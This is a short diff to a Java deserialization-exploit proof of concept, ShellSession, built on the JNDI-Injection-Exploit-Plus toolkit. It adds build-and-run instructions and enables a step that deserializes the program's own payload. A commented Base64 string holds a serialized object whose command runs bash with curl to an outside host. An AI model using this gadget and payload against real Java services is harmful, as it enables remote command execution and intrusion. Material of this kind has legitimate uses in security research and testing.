@@ -1,3 +1,8 @@
+//
+// javac ShellSession.java -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar
+// java -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar:. ShellSession
+//
+
 import java.io.*;
 import java.util.Base64;
 import java.lang.reflect.Field;
@@ -135,10 +140,10 @@ public class ShellSession implements Serializable {
         String base64String = Base64.getEncoder().encodeToString(payload);
         System.out.println("Objeto serializado en Base64: " + base64String);
 
-        //System.out.println("Deserializando el objeto desde Base64...");
+        System.out.println("Deserializando el objeto desde Base64...");
         //String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
 
 
-        //deserialize(otro);
+        deserialize(base64String);
     }
 }
